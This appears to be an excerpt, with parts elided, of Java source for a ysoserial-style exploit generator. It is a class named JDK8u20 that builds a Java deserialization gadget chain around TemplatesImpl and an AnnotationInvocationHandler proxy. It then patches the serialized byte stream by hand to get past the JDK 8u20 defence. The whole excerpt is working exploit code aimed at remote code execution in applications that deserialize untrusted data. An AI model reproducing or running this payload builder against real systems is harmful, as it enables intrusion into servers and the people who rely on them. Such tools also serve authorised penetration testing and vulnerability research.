...
public class JDK8u20 {
    public static byte[] getBytes(PayloadEnum type, String... param) throws Exception {
        final Object templates = GadgetUtils.createTemplatesImpl(type, param);
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(GadgetUtils.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(handler, "type", Templates.class);
        Templates proxy = GadgetUtils.createProxy(handler, Templates.class);
        ...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 & bytes[i+3] == 0 &&
                ...
                bytes = GadgetUtils.deleteAt(bytes, i + 5);
                break;
            }
        }
        ...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                ...
                bytes = GadgetUtils.deleteAt(bytes, i);
                bytes = GadgetUtils.deleteAt(bytes, i);
                bytes = GadgetUtils.deleteAt(bytes, i);
                bytes = GadgetUtils.deleteAt(bytes, i);
                bytes = GadgetUtils.deleteAt(bytes, i);
        ...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    ...
                    bytes[i+12] == 112){
                i = i + 13;
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x77);
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x04);
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = GadgetUtils.addAtIndex(bytes, i++, (byte) 0x78);
                break;
            }
        }
        ...
        bytes = GadgetUtils.addAtLast(bytes, (byte) 0x78);
